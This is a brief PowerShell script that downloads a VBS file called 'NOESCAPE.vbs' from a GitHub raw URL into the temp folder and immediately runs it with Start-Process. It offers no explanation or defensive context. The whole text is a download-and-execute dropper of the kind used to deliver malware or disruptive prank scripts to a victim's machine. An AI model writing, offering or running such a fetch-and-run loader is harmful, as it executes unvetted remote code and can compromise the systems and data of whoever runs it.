$url = "https://github.com/pa1chedd/vbs-scripts/raw/main/NOESCAPE.vbs"
$tempFolder = <link>[System.IO.Path]::GetTempPath()</link>
$output = Join-Path -Path $tempFolder -ChildPath "file.vbs"

Invoke-WebRequest -Uri $url -OutFile $output
Start-Process $output
